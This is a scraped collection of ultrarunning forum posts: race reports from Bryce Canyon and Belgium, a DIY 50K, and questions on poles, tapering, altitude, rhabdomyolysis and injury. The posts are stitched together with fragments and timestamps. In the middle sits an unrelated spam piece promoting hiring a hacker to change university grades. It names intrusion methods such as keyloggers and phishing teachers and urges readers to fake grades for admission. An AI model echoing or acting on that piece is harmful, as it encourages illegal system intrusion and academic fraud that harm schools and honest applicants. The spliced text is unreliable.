I get to the 2/3rds-point feeling solid enough, but a little bit hungry. My legs and stomach are mad at each other and I'm struggling to eat/drink while running, so I start to run the flat/smooth bits than fuel while walking the overgrown and rock-covered bits. The trail is certainly better now than it was an hour ago, but don't worry -- still plenty of un-runnable stretches to give me time to take in some sustenance.

I start to think about FKT pace for the first time in a while as I get down to 8, 7, 6 miles to go. My run-walk mix is still rattling off miles faster than the average pace of the current leader. I think about a couple of round-number milestones and what I need to do to bring my average pace to under 10:00 for the day (finish the last 10K in 8:55 pace, not happening unless it's somehow on a high school track). OK, sub-5 hours? Maybe with some low 9:XX miles -- the trail is looking better and better now, but I haven't seen another human being in two-plus hours at this point. There's downed trees or large branches every 100 or 200 meters; I try to jump over a very small one and nearly wipe out, and rethink that idea. Carefully stepping over them? Sounds good. No sub-5, though.

**The end**

I get a little morale boost from seeing a hiker with 5K to go, then two more. The last \~1.2 miles is stuff I'd seen at the very start of the day, and I laugh at morning-me thinking that this stretch of trail was the ""bad"" part of the day I should be running conservatively. I register a 5:04:40 and see my glorious Subaru with dry clothes, fresh water, and an internal combustion engine that will (hours later) get me back to a shower and couch. I get pizza slices *and* McDonald's in Tupper Lake, then have an uncomfortable 3.5-hours on my butt in the driver's seat before arriving back home.

In two weeks I've got my last day of preschool teaching for the year, followed by a [last man standing-style ultra](https://ultrasignup.com/register.aspx?did=79693) local in Syracuse. A week after that we're renting a truck, filling it with all our shit, and moving back to Oregon -- so this jolly FKT adventure was my Adirondack send-off, a nice little *so long and thanks for all the rocks*.

Care to share your running pole wisdom?,"To fit in with the euroboys at UTMB (CCC) this year I've bought myself some cheat sticks as I think they'll be a benefit for the elevation and gradient. It's something I tried years ago and wanted to give another go anyway so now feels like the right time. 

Anyone got any experience training with them and fancies sharing some learned wisdom? 

I've seen mixed reports on training with them: some said don't train too much with them or you won't have the legs but I'm of the opinion that that's wrong. I've used them once so far for a 25km 1500m elev. run and was absolutely dying, so sense says training should be specific to using the poles in the race and the upper body needs to adapt to the extra energy expenditure. 

I've comfortably done many ultras on my legs alone and never struggled so is not really a worry. I wonder if I should just be hammering the pole-specific training at this point?

Running Leadville 50SR next month and have some questions,"A little about me and my training as it pertains to the questions I’ve got. I’m in the Houston area. I’ve got 5x 50 miles weeks leading up to the taper. Starting training specifically for this race in January with over 650 miles. I’ve trained for marathons in 2019 and early 2020. This is my first Ultra. 

Maybe a question more for sea level dwellers or flat landers, but….

1. Coming from lower elevation, how did you feel at altitude for the race? If you can include # of days you tried to acclimate.

Maybe 1a. How much time do you think it added to your expected average pace/mi.? I’m trying to figure out what a reasonable time would be. It sounds like sub 9:59 finish seems doable on paper and Alger at goal, but looking at previous finishers times from my area, most are around 12hrs. Trying to manage expectations.

2. Any previous finishers can chime in on weather that surprised them? Ie. Cold in the morning and hot in the valleys, and cold at peaks. 

3. How many miles did you do training specifically for previous SR50?

4. How much vert specific training did you do? Either in a parking garage or treadmill. I’m a flat lander and had to use a treadmill. 

Thank you for any thoughtful or helpful replies. I’m anxious, have my doubts but really excited for this race. Most days I feel ready, but on bad run days those bad thoughts creep up. I don’t have anyone local that has attempted this distance, let alone the altitude and elevation to bounce these questions off.",ultrarunning,1623351149

First run in 4 months tomorrow. I. Am. So. Excited.,"Since January I have been living the IPOS life due to a stress fracture in my femur. It has been a long road back. All of the sitting has caused a flare up in FAI, a hip issue with makes it so that cycling isn't a viable option. Not having any good cardio in my life has had a massive negative impact on my mental health. Not being able to do what I enjoy, cancelling all of my races, cancelling my summer projects - it has been a hard year so far for me. About 3 weeks ago I was at almost rock bottom, with no end in sight, but yesterday my sports med doctor, and my physiotherapist cleared me to go back to running. Nowhere near the volume I was doing, and only twice a week for now, but running. 

I get to run a very easy 5km tomorrow with a minute of walking every 5 minutes, and it is likely going to be the most enjoyable 5km I can remember running.

### Background
So I started running about 8 years ago, doing a mile on the treadmill a couple of times a week, trying to lose weight. I slowly picked up running more often and further distances, but never anything further than a half marathon.

In 2018 I became interested in alpinism/mountaineering, learned a lot more about training theory and started keep better track of my fitness.

In 2019, I ran my first marathon the Reykjavik Marathon, I followed the [BAA level 3 training program](https://www.baa.org/races/boston-marathon/train/levelthree), mixed in with some of the lessons I learned from mountaineering training. Finishing that marathon was an incredible experience for me, it was such a monumental task, the weeks of following a training plan had added up to something incredible.

I had always been interested in ultras, and knew it was something I wanted and needed in my life. I had a few races I wanted to attempt in 2020, but Covid shut that down. Also, at the time I was located in Boston, and did not have a car, so getting vertical was always a bit tougher on the few trail runs I got out to.

Fast forward to 2021, I moved to the PNW.

### Training
I have read enough research papers, published studies, articles, reddit posts, and books (Training for the Uphill Athlete &amp; Running your First Ultramarathon) that I thought I generally had a good grasp of how to set up my own training plan, especially one that meshes with the flux of my life and can adapt with me.

The second half of 2020 was really bad for my running, but 2021 started strong. I got back into the joy of running, and by mid February I knew I was ready to start training for something bigger. I found a 50K (Ridge Route Ultra) which got moved to June 5th, which would give me ~12 weeks to ramp up training and mileage. I picked up the weekly mileage. From about mid march, I picked it up to 30-40mpw. I would aim to get 3-4 aerobic runs during the week, anywhere between 4-8 miles depending on the day. The weekends were either a trail run, or a long road run. 

April is when things started feeling more serious, I received my 2nd Covid vaccine dose at the beginning of the month and it put me off of running for a couple of days, but I eased back in to it. By mid April I was feeling good, but a bit scared by the distance, I knew I was capable, but I needed to break the mental barrier, on April 25th, I committed to running a road marathon training run (ended up with 26.7mi). I felt pretty good after, I took the few days after to do some easy active recovery runs, never letting my hart rate or pace sneak up, I felt solid. 

Now its May, 1 month to the race, two weeks after my training marathon I knew I needed to get on the idea of back to back long runs, so I did 19 road miles on Saturday, and 11 road miles on Sunday, those sucked quite a bit, but it felt nice to hit 30 miles, and know what tired legs were. I had a training friend who was running a trail marathon (and her first marathon) and she was a bit scared by the distance, so the following weekend, we went out and broke that barrier for her, we ran a trail marathon, making sure to keep it easy. The elevation gain, the heat, and the fact that I had not slept 2 nights prior made it a tough run. 

At this point I get an email from my original ultra, stating they were postponing the race to ""sometime in July."" I was too committed to June 5th, and to a 50k, so I began searching, but decided to run the Trail Marathon with my training partner. But needed something to scare me a bit, something a bit tougher, so I made the personal decision to add on some ""bonus miles"" to the race.

The following week, I added in some intervals and some stair climbing on back to back days, this hit my legs hard, but by the weekend I was back to feeling fresh. I was blown away by generally how well I was recovering, so I went out for another road marathon training run. This one took me through a slightly darker mental place, it felt harder mentally, but still doable. This run really helped make the marathon distance less scary, I know I can do it I just need to push the vertical, this was also the last big week before the taper began.

I dropped my mileage a very slightly for week 1 of a 2 week taper, introducing some hill repeats as my last ""hard"" running effort.

Week 2 of taper, or race week, I climbed Mt St Helens on Tuesday, felt tired on Wednesday, and didnt manage my time wisely on Thursday or Friday, so no more runs were had, Race Day was here.


### Pre-race
Race morning I woke up 2 hours before the race, grabbed a breakfast sandwich and iced coffee from McDonald's (the sandwich might have been a mistake). My girlfriend dropped off my training partner and I at the starting area, we grabbed out shirts and bibs, and hung out in the warm car. I look around, wondering if I overpacked my vest, I brought 1500 calories worth of snacks, 2 liters of water, my trusty Norvan SL, an emergency bivy, and my garmin in reach. The last two items might seem like overkill, but after the incident in China, I felt a few extra grams were more than worth it.

### Race
The race only had 40 participants for the marathon, I figured it would be a bit thin during the race. We get counted down, a few people fly off the line, we are starting up hill, into some snow patches; its cold, windy, and I haven't decided if that breakfast sandwich is going to come out of either end in a mile. 

Normally it takes me 1-3 miles to ""settle in"" to let my breathing, my heart rate, and my legs figure out that we are in this for a while. The first 3 miles gained about 500 feet vertical, not awful by any means, but all of the factors added up to making me wonder if this was a mistake. Mile 3-11 were all generally downhill, but the sandwich sat in my stomach, a constant reminder of a potential mistake. My training partner and I had communicated well in advance that we weren't going to actively run together, if one of us felt better, we had no qualms splitting off. But our paces matched, at mile 7 we talked about how we hadn't ""settled in"" yet and how it was a bit strange. But suddenly things sort of clicked, we picked up 2-3 other friends and made a solid middle pack. 

Mile 12 had a couple of aggressively sharp elevation spikes, this is when I remembered ""trail running is sometimes hiking, and sometimes walking."" Mile 13-16 had us lose over 700 feet, blasting down those hills felt incredible, the high cadence running downhill felt great.

Mile 18 had an aid station where I topped off with about 1 liter of tailwind because I knew the next 9 miles were going to be hot, and a non stop climb.

Our pack of runners all quickly ran out of words and just settled in for the continuous uphill climb, which finally broke with about a quarter mile to spare on the race, all we had left was a nice wide downhill to the finish. We all broke out into a run, and then a sprint to the finish line, crossing it felt amazing. Completing the race, getting back to in person events, cheering on other runners, I missed that. 

But my run wasn't over...

### ""Post""-race
My girlfriend was waiting for me in the parking lot, she was dressed for a run. She offered to put my vest in her car, but I felt that was against the spirit of the unnecessarily contrived goal I was going for. We started running laps around the parking lot, laps that were ~.2 mi. I made a point of not trying to look at pace, distance, or keep track of how many laps we were doing. I looked down at my watch, when I crossed the 30 mile mark, did another lap and that's when I figured out each lap was ~.2mi. those last 5 laps felt so long. I was mentally ready to stop. Finally we approached the car again, I had 31.25 on the watch, broke the 50K and stopped moving for the first time in quite a while. 

It was an incredible journey to get there, I loved everyone and everything it took to get there. Now on to another goal, maybe equally as contrived. A lot of people helped me get to where I was going, but huge thanks to /u/TylerCAndrews you are an incredible athlete and have definitely inspired me to keep pushing harder with running and in the mountains.

training for a 50K quesion,"So I'm in week 7 of my training plan, I normally do all my running on trails because i enjoy trails better.

Bottle bounce in chest pack,"Hi gang,

New owner of a Salomon ADV 5 here. I tried it out on a few short city runs, then did my first hard effort with it on as a solo 26 mile FKT. I've been super impressed with it (a little bit hot on my back, but manageable) and totally happy with the purchase. I was looking at a silly selfie video I took of myself on that FKT, though -- when I saw just how much my flasks were bouncing up and down as I ran.

How much of that is unavoidable, versus something I should try to eliminate? I've never worn a similar pack before -- I thought it was fitting and working just about perfectly, but seeing the video made me second-guess things.

Hyperventilate during long run,"Last weekend I completed my longest ever run, 30km (18.6mi) in preparation for my first marathon. I felt good in the first half and a little fatigued after that but in the last 5km's my breathing started to get really heavy as if I suddenly needed a lot more oxygen to maintain the same pace. After a while I noticed my lips were getting a bit of a tingling sensation which I think is a symptom of hyperventilating so I had to try and force myself to slow my breathing down.

"I did my first 100k on Saturday and I feel awful. How long does it take to get through the ""initial"" recovery phase for these things?","Background: I'm a fairly seasoned 50k+ runner. I have done somewhere between 6-10 50ks, and a couple of supported FKTs around 45 miles in distance. I am competitive at these events, I've placed in the top 3 for my gender at several 50ks and successfully claimed FKTs.

This year I decided to train for a 100 miler and I have been following a training plan pretty religiously since November for that. I've missed maybe 3 runs from the entire training plan since then. I have completed many 75+ mile weeks, long runs over 30 miles, back-to-back long runs etc. The 100k this weekend was my qualifying race.

I knew it would be tough since 100k is the furthest distance I have ever run, but words can't even tell you how crummy I still feel (it's Monday morning now, the race was Saturday). I still pretty much can't walk. My feet are still massively swollen and a couple of major muscle groups in my legs just basically don't work at all. I think I'm going to have to call in sick from work because of how much I'm hobbling. I simultaneously can't do anything but nap/sleep while also getting terrible quality naps/sleep because my heart rate and body temperature are still so elevated (per my health tracking device) and my legs are twitching and throbbing.

Is it normal for your body to just go through the ringer more than ever before once you kind of go beyond that 50 mile mark? Any tips for me other than the obvious stuff? I know it will be a while before I can do anything other than super easy short runs. But I'm trying to survive to the point where even going for a walk sounds possible. Normally by 24 hours after an ultra I can at least walk or go for a recovery bike ride.",ultrarunning,1623064814
Walking vs Running (Beginner Query),"Hi all, first some background: I have my first ultra in a couple of weeks at the UK Race to the King. It’s 53 miles over hilly terrain with approx. 5,000 feet of altitude gain. I have been training c. 50 miles per week for a few months and lately have shifted my training away from flat running more towards trails and hills, so I think I should be more or less good to go. I’m shooting for around 9-10 hours, but that is probably too ambitious. My “B” goal is under 12 hours and my “C” goal is avoiding a DNF - quite a wide range given the unknowns involved in a first ultra!

For reference, I have a 1:27 HM PB but haven’t run a competitive marathon before - I started running last year to cope with lockdowns like many others I’m sure! My longest training run (or any run) so far is 22 miles, but I am planning to do 30 miles today as my final long run before tapering for the race.

As the race as drawn nearer, I have been researching ultra running a bit more and noticed that a lot of resources recommend walking uphill sections to save your legs/lungs. In my training I have tried to avoid this other than for scheduled walking/eating “breaks” or if my heart rate has really spiked. 

My questions are: if I am shooting for the best time that I am capable of (whatever than may be), should I be walking the hills to save my legs? Should I walk the initial hills to save my legs for later? Or am I ok sticking to the approach I have been using in training (walk only when needed for food/drink or to settle a heart rate spike)?

Exertional rhabdomyolysis in Ultra Running,"Does anyone have any experience with mild (not clinically relevant) but still very painful rhabdo in ultra? 

To explain a little, in general rhabdo is system wide muscle breakdown but different from typical muscle soreness. In extreme cases it can cause bruises and kidney damage (marked by dark urine or peeing blood). Mine never gets that far. After about 60 miles I experience full body pain on impact while running. It will get worse the longer I run, does not respond to ibeprophen,  but will be completely gone the next day. My doctor (okay, husband/ doctor) has generally diagnosed me with mild rhabdo. At first I thought I was under trained for the distances I was attempting but this year I'm much much stronger and still seem to be experiencing the same pain levels at the same distances. I can find very little in the literature having to do with endurance athletes 

I ran a 100 miler last weekend and was unable to run the last 20 miles but my quads, hamstrings, calves never even got sore the way they do if I run a hard effort 50k.

"First DNF, worried about upcoming races","Just for some background I've ran quite a few races but only two ultra races including this one.

A 50 miler a couple years ago and a 50K that I DNF'ed this week.

The whole race I felt terrible. Really achy legs / feet and my hear rate keep spiking to 170 even when I was walking at the end. I felt like I had already ran 30 miles by mile 10. By mile 17 I decided I would DNF at the next aid station and the next and 4 more miles of mostly walking I ended the race at 21 miles.

I think it was a mixture of not being acclimated to humidity, not drinking enough and just maybe having a bad day.

I ran a 25K the week before with more elevation at an average pace of 8:15 per mile and felt amazing

This DNF has really took a huge chuck out of my confidence. While at the time I really felt like I couldn't go any further I can't help but think I just didn't try hard enough and I could of pushed through it. I'm now second guessing my 100 miler in November.

**Where Can I Hire a Hacker to Change Grades?** 

So which brings us to the main question — Can you hire a hacker to change your grades? Yes, it is possible to hire a hacker to change your university grades and college grades. It has been done time and time again. It mainly depends on the kind of security behind your school’s system.

I had a personal experience when I was in college, I accidentally “hacked” my grade book system. On my grade book, if you clicked a teacher’s name, it would show you basic demographic information about that teacher, which was all supposed to be public. This included their work email address, to which student emails were supposed to be directed, so I frequently used it to verify that I was sending emails to the correct address.

One day, I was trying to email a teacher, and wanted to verify that I had the right email address. I opened my grade book, and logged in using the password that my browser had remembered, but it occurred to me that I had completely forgotten what that password actually was.

**Hire a Hacker to Change Your University Grades**

So, I went to this teacher demographic page, and verified the email address. Afterwards, I decided to go to my own profile page to see if I could find or change my password. When I went to my profile, I noticed that, instead of my name, it said the name of the teacher whose demographic page I had just checked. And near the bottom of the page, it had a password box with the teacher’s password.

From a computer security perspective, like almost every website where you log in and out, I would assume this website had a variable which stored the name of the logged-in user. However, this was the same variable as the one that stored the name of the teacher when you went to look at demographic information.

Then, when you go to your profile, it just accesses the information of whoever is stored in the “user” variable, without using any encoded session ID or token or anything to verify that the value of the “user” variable was actually the user who had logged in. To this day, I cannot believe how awful that security was. At that age, I didn’t know any of that and had never looked at computer code before, otherwise I would have experimented to find the flaw.

**Hire a Hacker to Change Your Grades on College / University Transcript**

A few days later, the teacher went over to me to brag that he had fixed it (I think he was under the impression that I had intentionally found the exploit as a white-hack or something). The layout was changed and the teacher demographic page was removed. The next year, we switched to a completely new grade book system.

I’ve never heard of any grade book with such poor security standards, but there have been cases where students have hacked grade books and changed grades. These include placing a key logger on campus computers, phishing the teachers, befriending teachers and getting passwords, finding passwords on unattended computers, etc.

But, possible, legal, and moral are three different things. Is it possible for you to hack a grade book and change your grades? Probably. Is it legal? No, and it’s very rare to be able to pull that off without getting caught. If you change only your grades, if anyone ever happens to notice, you’re caught immediately. If you change a bunch of grades, the discrepancy becomes obvious, and the changes will likely be reverted.

**Best Solution to Hire a Hacker to Change Your Grades**

Let’s say you’re in college, applying to an elite graduate school, so you change your grades to ensure your GPA is high enough, and you get in. That means you have automatically become qualified and actually earned admission. If you are not really left with much options, this might seem the smartest thing to do. What are you waiting for?

Dealing with injury as an ultra runner,"I've been dealing with a knee injury for the last 5 weeks, likely a lateral tear in the patella tendon. Lots of pain increasing when I try to run. I tried PT and a special patella brace, but nothing stops the pain from returning. Next week I am getting the tendon needled to facilitate faster localized healing, after which I will not be able to do anything with the leg for a week. I'll have to build up strength walking after that.

Something I could never have imagined is the mental toll that injury can take. Over the last 2 years since I started running, I've created an identity for myself as ""the runner"" to all my friends and family. Training for a still upcoming 100k was the highlight of my year, and I know everyone was probably tired of hearing me talk about it. 

But now that I, a runner, cannot run, I feel like this identity I've created has crumbled to dust and I don't know what to do. I can't concentrate as well, I'm losing motivation to do other things, I'm starting to gain a little weight, drinking more...

Should I pack lighter in a race?,"I’m not officially an ultra runner I suppose, I use running as training for mountaineering/alpinism but I still put about 100km/week running into my training.  Weekends I go on 30-40km self supported runs purely for fun and training.

Due to covid cancelling my plans to climb in the pamirs, I found a 52km race a couple hours from my place in August.  I really want to do it.  Not worried about finishing etc, I’ve completed many 50-75km runs on my own over the years but never ever done an official race. 

The longest between aid stations is around a dozen km… I’m used to carrying 3L of water with me between bladder and flasks… I won’t need to carry that much for 12km.

Am I thinking about this right? I have to wrap my head around bringing less water and less food since I’ll have aid station support for the first time ever?  Or should I keep with my current system that I know works for me… (I would definitely say I drink much more water than average).

I’ve got 2 months to test out pairing down kit I suppose, and I would use race as just a long training race but curious what a competition scenario might be like.

53miles after less than ideal training - last minute training tips?,"Looking for some advice, thanks in advance. I have a double marathon (53.6 miles) in two and a half weeks with 5,051ft of elevation and my training has been somewhat disrupted by life getting in the way. 

Six and a half weeks ago I ran a 6hrs15min PB 50k, and four and a half weeks ago I ran a 5hr55min PB 50k (I'm solidly mid pack) - both with similar elevation changes and on similar courses to the forthcoming double marathon. I recover fast and doing two 50ks in two weeks was fine. So I'm not being stupid in doing the double marathon. However, I usually average about 30miles a week, but that can vary from like 20miles to 45miles. Since the last 50k I've only averaged about 22miles a week, in total, with my longest run being 10miles. Which is obviously not ideal. Have got a few long hikes in in that time though.

What I am wondering is what it's worth me doing in the next two weeks? It's gone warm and sunny here (UK) and I suspect that it will be like that for the race, so I feel I should try and acclimatise a bit. But obviously at the stage I'm not going to be able to do much useful training. Is it worth a last long run? Or just keep things ticking over? My races goals are: A goal) sub-12hrs; B goal) sub-15hrs; C goal) finish. So I am not putting any pressure on myself - I just want to finish in decent shape. Any advice much appreciated.

Also, I've not done more than 50k before, so anything I should know about 53miles that's drastically different? I am aware eating enough is more important … thanks!",ultrarunning,1622703050

Three weeks between a 50k training race and 50 miler?,"I'm trying to figure out if this makes sense. I ran my 3rd unsupported 50K in May. I felt relatively good after a week, and am been getting back to regular training load after two weeks active recovery. Achilles is a bit annoying, but switching to plushier shoes has helped. Increasing back into 40mpw this week, and more later.

I'm trying to see if I can squeeze in a \~50k race three weeks before a 50 miler, while still running in between. I'm figuring with a supported race, the 50k should be easier, although with way more elevation.

* 6 weeks training in trails
* Tapering 1 week easy trail runs and hikes
* \~50k race (""easy"", not aiming for PR, just completion) - 2k+/- elevation
* Recovery and tapper?!

   * 2 weeks easy runs tapered load

First Ultra at the end of June and I need help picking a hydration vest - should I buy a 5L or 12L Salomon Adv Skin?,"Hi all, I'm a road runner and am trying out my first ultra at the end of June. It'll be a supported 40ish mile trail run (not an organized race or anything, just doing it with my sister). I'm a road runner typically, and so I have some hydration belts but they don't hold nearly as much gear or water as some of these vests. After trying on some vests at REI, I think the Salomon Advanced Skin were the most comfortable, but I need help deciding between the 5L and the 12L. 

The 40 miler is supported (so I am not even sure if I'll need a vest?) but I do enjoy trail running quite a bit and am hoping to get in some longer solo runs in this summer in the mountains. I'm trying to get a sense of whether it is worth upgrading storage to the 12L from the 5L. What kind of gear would you need that won't fit in the 5L that I would need to upgrade to the 12L?

Help me set up a tapering schedule,"Hello all! I have my first trail race/ultra planned for three weeks from now. It is a 50K with 7,400 feet of elevation gain. 10 hour cut off time for the race. My goal is to finish and have fun.

I've completed two road marathons in the past (2018/2019) in the 3:45 range. For the last 12 months I've averaged about 45 miles/week. The last several months it's been closer to 55 miles/week. I'm 49 and female.

I was training for a half marathon using Hanson's advanced. I didn't have a specific one in mind, just using the schedule. About two months ago I decided that I should train for a 50k trail race instead. I've been running the roads during the week and a long threshold run once a week. Weekends I've been hitting the trails and doing trail runs both days with a longer run on Saturday (3-7 hours) and a shorter run on Sunday (1-3 hours).  I am super slow on the trails, but have been training with some good elevation. Saturday was my longest day with 6,900 feet of elevation in 22 miles (super slow at about 19 minute miles average). I actually felt okay yesterday and did a short trail run for an hour and then went on an easy hike with the family. I feel fairly prepared at this point to do 7,400 feet in 31 miles. 

My question is about tapering! I really suck at tapering. I'm really wondering what I should do for the next two weekends to prepare. I can decrease the weekdays fine I think, but don't really know how much I should back off for the weekend trail running.

Thanks in advance!",ultrarunning,1622470448
Finished first 100 miles race!,"So last weekend I've finished my first 100-mile race and I've finished quite allright. I never thought about giving up once so my experience could maybe help other people. The race was Grand Trail des Lacs et Chateaux in the Belgium Ardennes, 165km and around 7000D+ which is pretty serious for this country since it's mostly flat ([https://grandtrail.be/en/courses/gt-160-2/](https://grandtrail.be/en/courses/gt-160-2/)).

It took me around 31 hours to finish. I took longer then I wanted because my friend got injured at the 120k mark and they needed to evacuate him. He blew up his achilles and couldn't even walk. This was his own fault though, he trained like \~50K a month for the last 3 months so I was surprised he even made it to 120K. I wasn't going to quit because of him though and once he was safe I continued my journey alone in the middle of the night deep inside the creepy forrest where a lot of eyes were watching me :) 

I'm pretty sure this was the thoughest thing I've ever done. I mean I did Marathon des Sables in 2018 but that was relativley easy compared to this. This was so damn technical, some parts I could only go like 2-3 km/h plus staying awake for 31 hours while navigating along side dangerous cliffs and waterfalls is already a challenge on it's own.

Nutricion is def. the most important thing during a race like this. My body was just screaming for food the entire time. I had cliff bars as fuel and sometimes I took around 3 in 1 hour! Insane.... I'm so sick of them right now I can probably never eat them again.

The second most important thing is water and salt. I was drinking a lot and I also had sodium tablets which contained salt and magnesium that I took like every 20K. I was also eating salted foods at the checkpoints (mostly chips and chicken soup) and had around 15 bananas total. I am a salty sweater though, I knew this from MDS where I took a salt tablet every 30 min. My entire backpack was white of my sweat.

I did pee every once in a while and looked at the color. If it became dark yellow I took more salt and drank more water until it was light yellow again. I managed this really well and felt great the entire race. I also had a lot of coca cola at the checkpoints for my cafeine needs :)

Right now my body is totally exhausted but I do feel great. I still can't believe I've finished a 100-mile race, I never thought I could do this. It just seemed impossible but a decent amount of training, preperation and good management of nutricion and I have my 6 ITRA points :)",ultrarunning,1622449092
Race Report: Bryce Canyon 50k (my first ultra!),"**Pre-race**
This may have been the hardest thing I have EVER done. Starting on Thursday, I increased my carb intake a lot, hydrated like mad, and rolled out my legs as much as possible.

The morning of the race started out well. I was up early, ate my normal oatmeal, protein powder, and banana, and hydrated with water + nuuns and coffee. I was at the start with plenty of time to get ready and man, I was nervous, but I was also really excited.

**Start to Proctor Canyon (miles 0-3)**
The run to the first aid station was fine. It was still cool and while sandy, not difficult. I drank a bit of water, ate about 100 calories, and was still in a great mood! I did not stop at this aid station. 

**Proctor Canyon to Hillsdale Canyon (miles 3-8)**
The next trek to the second aid station was technically tricky but again, not too hard. There was a LOT of uphill on ridges and a ton of people, so this was slow. I was still feeling great! The weather was low 60s, I was eating around 100 cal every 30 minutes between gels and taking in liquid hydration (~400cal total). By this point I had probably consumer about 1.5L of water. At this aid station I refilled my pack with water and grabbed some watermelon and grapes and just kept going. 

**Hillsdale Canyon to Red Canyon (miles 8-14)**
This was great! I felt strong and was able to keep a good pace. There were rolling hills and some ridges but nothing too technical. Again, I was eating around 100 cal every 30 minutes between gels and liquid hydration (~400cal total). I also ate a banana since it was not hot yet and I figured I could keep it down. During this section I started using my salt tabs to prepare for the heat that was coming. I likely drank 1.5L during this section. At this aid station, I again filled up with water, got more tailwind, grabbed some applesauce and more watermelon, and kept moving. I was still in a GREAT mood, plodding along, happily running through the hoodoos. Little did I know the misery that was ahead. 

**Red Canyon back to Red Canyon (miles 14-19)**
This was the loop from hell! At this point the temperature spiked above 85F and the climb was completely exposed. It felt like it was a constant uphill along ridges, somewhat technical and VERY SLOOOOOOW. It was absolutely gorgeous, but this nearly broke me. After this I was seriously considering dropping. Making friends is what got me through this section. It was SO hard, but we were all in it together. It is amazing what having others to commiserate with can do for your state of mind. Once we were out of this loop and back on the flats, I had to walk more than I wanted. My body was just spent. Big reason, I didn’t consume enough calories. I just couldn’t deal with eating while trudging through this which was a major mistake. I likely only took in 200cal during this loop, but I think I drank 1.5L. I did take in a gel with electrolytes and caffeine. 

Back to the aid station, I grabbed a lot more water, more fuel from my drop bag, more tailwind, and went to the bathroom. I drabbed more watermelon, applesauce, and just kind of chilled for a couple minutes. This is where things started to hurt. It was HOT. I think we were going above 90 at this point and it was dragging me down. Before heading back onto the trail, I soaked my buff in cold water and poured it on my head and then wrapped the cold buff around my neck.

**Red Canyon to Hillsdale Canyon (miles 19-25)**
With the heat and the altitude, I was starting to not feel great. For the remainder of the race the temperature was above 90F with a max of 95F. Out of the aid station I just walked a lot. I took a salt pill and some water and started to feel a bit better. I was moving along though, running on the flats and downhills, and made another friend. At mile 26 though I fell and that cost me time. Other than a bruise on my left shoulder and scraping my left knee, I was fine but the swelling in the knee started to slow my pace. 

And then came another massive climb. This was unreal. We were grouping up again and EVERYONE was struggling. It was like this came out of nowhere, the heat was absolutely the contributing factor at this point. I also had my slowest mile EVER here. My left knee started to hurt, and I had to sit a couple times. I also ran into another runner who was seriously dehydrated so I stayed with her for a while, gave her a salt pill and some water, and made sure she was ok (she ended up DNFing at the aid station). The heat was seriously no joke. During this section I drank 1.5L of water, ate only 300 calories (again, major mistake but I could not take in more), and had a salt pill. 

At this aid station I refilled water (but not my hydration back, whoops!), but I don’t think I grabbed any fuel. Nothing looked good. I did think about dropping again but realized I was just being ridiculous and pushed on! 


**Hillsdale Canyon to Proctor Canyon (miles 25-30)**
We had one last climb and again, wtf. It was awful. Around mile 28, my right foot was bugging me. I was assuming I was getting a blister on the bottom and my toes were sore. This made it really hard to run so I shuffled along and basically gave up on finishing in less than 9 hours. This part was pretty uneventful. I ate another 300 calories, drank ALL the water I had on me (1L), and was so happy when the elevation was over. The run into this last aid station was magical. When I got there, it turned out there were out of water, so I grabbed some gnarly (do not recommend) and some pickles. 

**Proctor Canyon to Finish (miles 30-33.8)**
These final miles were all downhill, thank god. It was SO HOT! I ran a bit but again, shuffled along. My right foot was really bugging me but I was so excited to nearly be done. With less than 2 miles left, I started to cry. I was SO overwhelmed. I never thought I would be able to do something like this. When I saw the finish line and could hear the music, a rush of excitement came over me and I found the strength to run along the finish line. As they said my name, and announced this was my first 50k, I started to sob (all on video, lol). I was just so fucking overwhelmed by this experience. 

**THE END!**
I stopped at the medic to clean up my knees, ate a burger, Oreos, bananas, and chips, and drank a lot of water. Once I took off my shoes, I realized there was SAND in my shoe that had built up on the bottom of my right foot. This is what was causing the pain. There do not seem to be any blisters, but my toenails may not fare well. Right now they are ok, but my toes are sore. I am also pretty sure I have planter fasciitis in my right foot. But other than that, I FEEL AMAZING! I am not too sore, I can walk fairly well, and I am ready to do this again!!!!

Through this experience, I learned that I am capable of so much more than I would have ever imagined. Between the altitude (7000-8500ft), the heat (85-95F), and the elevation (5882 ft), this was hands down the hardest thing I have ever done but will absolutely carry me forward through future ultras. For a first ultra, I think I selected an incredibly challenging one. The race was overwhelming and emotional. I doubted my ability many times, several of the climbs made me consider dropping, the altitude kicked my butt, and the heat was intense. But I was determined to finish. Remembering my training, and the advice you have given me, I was able to work through the doubts and I found my rhythm. Because of my training, I learned how to handle the pain and challenges this trail threw at me. I knew that I was just being dramatic when I felt like quitting and that if I did, I would SO DISSAPOINTED WITH MYSELF.",ultrarunning,1622417204

Pace: 8:35
Place: 3rd overall

Goals:
A. 8:30 avg pace (close enough on this one!)
B. Sub 5 hour finish (check!)
C. Finish (check!)

Overview:
The race went better than I could have hoped! I started off feeling incredible and kept my pace steady for the first 8-9 miles. I wasn’t going in expecting or planning to place, but when someone told me I was in third at mile 16...I had to hold it. I’m really thrilled about placing, especially since I’ve never run a race over 10 miles before and only really started running 7 months ago.

Pre-Race:
Friday night, my girlfriend, Ally, and I mapped out the aid-stations and put together food/hydration packets for hand-offs. The schedule we set up was as follows:

3 bags of roughly 200 calories of dried fruit to be handed to me at the 1/3 and 2/3 aid stations. (Same one since it was an out and back) I ate food every twenty minutes. 

Five Gu to be taken every hour. 

4 nuun tabs for the first 9 miles (though I opted instead to stick with nuun until mile 22. 

1 liter of tailwind for mile 9 onwards (switched to mile 22 as noted above)

I carried a 17oz handheld, which I topped off at every aid station.

On race day, I had a granola bar and a banana at 4:30am. I drank a redbull at 5:30.

I chose to wear a lightweight long sleeved shirt going out, as the temp was in the high 30s. At mile 9 I changed into an ultra light short sleeved shirt. This turned out to be the pro move. The weather wound up getting hotter than forecasted.

The race!

Miles 1-6 - Start to the Tunnel Aid Station

The first leg of the race went great. I was feeling a bit of soreness in my left calf, but that resolved itself after mile four.

Rather than rushing out, I tried to keep mid-pack to conserve energy. I settled into an 8:30 pace with a group of 4 other runners. We all ran together until mile 7.

Mile 4 was the road section with an unexpected 200 feet of climb. Going out this was easy...coming back not so much. 

Miles 6-9 - Tunnel to Hollywood AS

I split from the group at mile 7 and kept a comfortable pace ahead. This stretch was relatively uneventful. I made a point to eat as much of the first bag of dried fruit as I could. I made it through most of it.

Miles 9-15.5 - Hollywood to Tin Can AS

The handoff and shirt change at Hollywood went suuuuper smoothly. I was in and out in 30 seconds. Huge thanks to Ally for being super on top of crewing.

After Hollywood I let my pace get away from me a little. Logged a few 7:40-7:50 miles, which I knew would come back to bite me later. I started passing runners from the tail end of the 50 mile here.

